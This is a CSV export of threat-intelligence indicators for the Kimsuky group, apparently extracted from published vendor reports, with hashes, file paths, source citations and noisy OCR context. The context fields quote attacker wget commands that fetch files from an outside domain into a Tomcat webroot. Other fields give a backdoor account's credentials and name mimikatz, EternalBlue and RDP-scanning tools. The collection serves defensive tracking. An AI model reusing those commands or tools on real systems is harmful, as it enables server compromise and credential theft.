1.0.0,actor--kimsuky,artifact--sha256:dbd0d9a0e9bf3f33e3fde507ed33658032f5446a11bd5c2d16f0f3a4478e1f0c,observation--sha256:3272a6f9119383f335c18564cd84421de503395689c224ae2ce7afca98493330,file-path,%APPDATA%\Roaming\Intel\Driver\cachew[].cache,%APPDATA%\Roaming\Intel\Driver\cachew[].cache,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:015f1c3e6f88580837de577173a02bcacde14a220cadc1b4e51469d526b827b3,observation--sha256:af522e9cfe389fed5832dc25970133f70fbfe79a6feff1e0caa6130a484aef2d,file-path,%ASD%\downloads\mimikatz_trunk\,%ASD%\downloads\mimikatz_trunk\,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:620c65dd29397f4ec48d46614c28a4fefa1235be54b547c3efcea7b3a7985738,observation--sha256:fe5e5640c9f9c075bbf7952ed5c084b9c8ee4f50c06f8db50b5731dfb8e51c91,file-path,"%System%\termsvc.dll,  which  is  RDPWraper.","%System%\termsvc.dll, which is RDPWraper",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a73c9f74e958f89e14b7c8d485bf5fbd0b4411ef4e46c83a8c78fe45a4ae05a6,observation--sha256:d1c0fd50592e1ce17393da1bf00160afbc29acbba56a280e35f87a9964c996ac,file-path,%SystemDrive%\%ASD%\Downloads\11\eternal_bin\Double,%SystemDrive%\%ASD%\Downloads\11\eternal_bin\Double,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f36c93fde04008928945de3b9a512dc099eceda5f66c5a40e556b4eb92d4ead4,observation--sha256:712034e53f5e9c6b9369b87a050ecee00c0abfa170575fc0c51dbc75fdbb93a1,file-path,%SystemDrive%\%ASD%\Downloads\11\eternal_bin\Estee,%SystemDrive%\%ASD%\Downloads\11\eternal_bin\Estee,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d958668be815199ff425763838c38838066b6ac3199e67f00fca61b06e1d8dfa,observation--sha256:60f65bc5827b5120ede261f793002aa53d4507625a3d2a655eeeeb02ac0d7f87,file-path,%SystemDrive%\%ASD%\Downloads\11\eternal_bin\Eterna,%SystemDrive%\%ASD%\Downloads\11\eternal_bin\Eterna,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:840df77e7b9c98820ff8056f474d59d87fed5ca87259536cf64e483a539a09e7,observation--sha256:13786029cc3547f92b1abaf760ad7200f4b22a8eb6f0927e4a6ed50dc62b5b92,file-path,%SystemDrive%\%ASD%\Downloads\11\eternal_bin\storag,%SystemDrive%\%ASD%\Downloads\11\eternal_bin\storag,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9bdf2ccdd2870b2f1cf563c3df9220177245ee7bb81f6a8990e0a909b883ba95,observation--sha256:925518da19e90af03d813924a32b3d61f2f6fec539fe59c706567a5cbf110ba0,file-path,%SystemDrive%\%ASD%\Downloads\NSA\eternal_bin\stor,%SystemDrive%\%ASD%\Downloads\NSA\eternal_bin\stor,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8a12e0ba6cc6d353a0d27d69c9bbb4a2b97c7414543567d50c9b7720f463f614,observation--sha256:c656ba0230d8d8c7a0cbee305da689c9c200d3cecfa7f17690e588c693344050,file-path,%SystemDrive%\metasploit-,%SystemDrive%\metasploit-,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1b30b78dc5e039d901ba54a2c488f4754136e51403aa98fb68875f3b1f81dde6,observation--sha256:1c660e1e1ae03b2e5c774814504730d75f2a5851670b7bc5f98fabe098946161,file-path,%SystemDrive%\users\%ASD%\appdata\roaming\chrom,%SystemDrive%\users\%ASD%\appdata\roaming\chrom,candidate,2023-07-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 86}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"RdpScan_ZoHoo_1216.exe Connects to network 59.103.***.***:3389(PK) Trojan/Win32.NsSpy 4 URLs mapped (indicated in light red) accessed for malware and phishing testing purposes in 18*.10*.21*.11*(KR) %SystemDrive%\users\%ASD%\appdata\roaming\chrom Operation Covert Stalker Report 2023-07-16 17:45:49 2023-07-16 10:43:10 Data Trojan/Win32.NsSpy 15:47:45 2023-03-11 72.255***.***:3389(PK) Since there are frequently used patterns, you can consider them as a blocking policy in your firewall, but be care",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:91e1787d7e78d64911840c712812360ecc126b37834c8a5cabc200075f24bb58,observation--sha256:b7bdc2b370cd4d5eb92a4e944332d4a3263906e897332e6bcc89460630f6011a,file-path,%SystemDrive%\users\%ASD%\desktop\surrogate\tools\tools\passrecpk\wirelesskeyview64.exe,%SystemDrive%\users\%ASD%\desktop\surrogate\tools\tools\passrecpk\wirelesskeyview64.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7d38a8b2d7eb02e0efb5e7394ccbd8ebb738febe55ac3d322a7e0bc20c3ce199,observation--sha256:ce8e53a47aa3d6ccfce3a9159cc1ec95942703ae0b14816fff0d923b33716840,file-path,%SystemDrive%\users\%ASD%\desktop\tools\tools\tools\tools\mimikat,%SystemDrive%\users\%ASD%\desktop\tools\tools\tools\tools\mimikat,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4879a67640d9d0d7dfbce1e0b0c9e8d89a1e837563b3ab70252181dda7712b86,observation--sha256:bbbb36837c782f63d356d2f8847f834ee44afb22d23cc56c1e83a1c8ef31e7ef,file-path,%SystemDrive%\users\%ASD%\downloads\,%SystemDrive%\users\%ASD%\downloads\,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 81}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"domain_x64.dll hxxps://www.bleepingcomputer.com/news/security/microsoft-to-kill-off-vbscript-in-windows-to-block- Macros inserted into files and documents, Powershell scripts provided as Windows functions, and Windows system commands Diagnostic Time File Name 2023-02-24 Removing VBS will not have a significant impact on hacking organizations. The reason is that even if the hacking organization is not VBS, hxxps://learn.microsoft.com/en-us/windows/whats-new/deprecated-features The malicious code ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4879a67640d9d0d7dfbce1e0b0c9e8d89a1e837563b3ab70252181dda7712b86,observation--sha256:f4c4aa35c08c5babe8c55e186c172d12dc399ad0440efbcb68ec7a75e7cf22a4,file-path,%SystemDrive%\users\%ASD%\downloads\,%SystemDrive%\users\%ASD%\downloads\,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"82 2023-02-24 %SystemDrive%\users\%ASD%\downloads\ eternal_bin\defaultes_x64.dll dns_x86.dll 11:49:15 11:49:15 (Table 47) Vaccine diagnosis log of 6*.9*.20*.24*(KR) Even taking this into account, the structure of the C2 communication header was judged to be very similar to past malware. dll %SystemDrive%\users\%ASD%\downloads\ %SystemDrive%\users\%ASD%\downloads\ defaults_x64. 11:49:16 dns_x64.dll Operation Covert Stalker Report %SystemDrive%\users\%ASD%\downloads\ eternal_bin\dnsadmin_x86_2003.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bdc5c57db67d0d6c1f9c73e9e9236db6200131a9d5fa95c9e4287f90ef070bbe,observation--sha256:f2334b256212f72644d0ad9c4e5a2cfcfb5b5eb20230dcec173aec14d2932598,file-path,%SystemDrive%\users\%ASD%\downloads\eternal_bin\dns,%SystemDrive%\users\%ASD%\downloads\eternal_bin\dns,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f7ac0948b4ecf4be77e4f59cf4670456d185db5b352059d33056098aab93fabe,observation--sha256:29c50c32cde87cb2b4c1ce85f905c8251b752f1decae8ad9b1c7016835021918,file-path,%SystemDrive%\users\%ASD%\downloads\eternal_bin\dou,%SystemDrive%\users\%ASD%\downloads\eternal_bin\dou,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6f279f8baaebe55b369501ac72dd44f7ddcab8f9f647adb8394a3f45fe8b61bc,observation--sha256:744f9b6b81ffa6cb719887ae50e06ef83cb2aa103b81e57d6439e590012a6ca7,file-path,%SystemDrive%\users\%ASD%\downloads\eternal_bin\este,%SystemDrive%\users\%ASD%\downloads\eternal_bin\este,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:56137b9d827c2dff8af2a108fedd2ff2fda601d565fed03d50145422f65af234,observation--sha256:8bc91f04d0d12552c4c62cb0a2faadb62e904cd89400e705316d1375f1ab4878,file-path,%SystemDrive%\users\%ASD%\downloads\eternal_bin\eter,%SystemDrive%\users\%ASD%\downloads\eternal_bin\eter,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b5f1e032ff62fd42804f2dd6b9d28e0fd41cd3d986e663254b3cc7cdfd775111,observation--sha256:ecd1d44d3bcb33702e1300d33968d2638dae462a8ad50571c970f9cb0693b609,file-path,%SystemDrive%\users\%ASD%\downloads\rdp\rdpattack_la05_x,%SystemDrive%\users\%ASD%\downloads\rdp\rdpattack_la05_x,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9f092f3a717f4bb2c4ce2b832c1ffb5deeb378f57bdc78a077c6f3c683a3ebc3,observation--sha256:e8613a60d3174536b6ca7e156b70f49ee766a95b91c3aabf5676a96daf35b91b,file-path,%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12,%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c3296b8f04ddf4815c78b5b788f80bf0e57819bc7ee6589c93e2ef4cdb216f58,observation--sha256:bcda8478254f62988d782cb9b0ad45c2d7ceb173ae0d9761dad5f0e0599bc5bb,file-path,%SystemDrive%\users\%ASD%\downloads\rdp\router  scan  v2.47\routerscan.exe,%SystemDrive%\users\%ASD%\downloads\rdp\router scan v2.47\routerscan.exe,candidate,2022-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 68}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"%SystemDrive%\users\%ASD%\downloads\rdp\rdpscan_la05_12 (Table 30) Antivirus hacking tool diagnosis log 27.102.***.***:3389(KR) Connect to network RdpScan_La_1226.exe Operation Covert Stalker Report 10:34:39 Among the four phishing URLs that exist in the destination (hxxp://C2//Download.php or test.php), nidlogin.navernnail.com Behavior 18:53:35 27.102.***.***:3389(KR) 2022-04-13 22:05:56 RdpScan_La_1226.exe 2022-04-13 Connect to network (Table 31) RDP (CVE-2019-0708) vulnerability scanning acti",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e65e43c73869a9921fb5e6822c0b49f20e7b61d335771312ce7f1d82b18fc952,observation--sha256:0ec87c44c2e9cfabf57cd2c50dc0db7250a7924fd580b5ef9bd39e6602c6d2cd,file-path,%SystemDrive%\users\%ASD%\downloads\tools\svchost.exe,%SystemDrive%\users\%ASD%\downloads\tools\svchost.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8508f5563a38f55c8ebf3b0c134902c59a9f1de1e3b4f3027ff600b22e546148,observation--sha256:6583453f330f4db8a80a042f40c9cb5d89fc28517542cfda719504767a5c45f6,file-path,%SystemDrive%\users\%ASD%\downloads\tools\x86.exe,%SystemDrive%\users\%ASD%\downloads\tools\x86.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f2e6fc6fb4826b147195f1b1324d4702170e65a8831667b4f079cf02d6496dc9,observation--sha256:f0c282236f64de7da3950ca1a1894e2aaffcae885fc49095deefbc200bb4ffc9,file-path,%Temp%\dlllog.log 中，最终将此文件上,%Temp%\dlllog.log 中，最终将此文件上,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 7}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[7] . 在 dll 中执行间谍模块 木马将执行记录和主机进程列表信息暂存到 %Temp%\dlllog.log 中，最终将此文件上 传到 FTP 服务器。 图[8] . 木马记录的日志信息,
1.0.0,actor--kimsuky,artifact--sha256:00f6ce96fce4ee7cadff1d0a5b4014a5d6e2b9f2915e88a7d8e9dce30c0db62d,observation--sha256:d580a8bbc8da364cee7f03b7a30b100be7467dd9c2d75cda6357cd2ad2ecf054,file-path,%Temp%\low\pay.exe 或,%Temp%\low\pay.exe 或,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
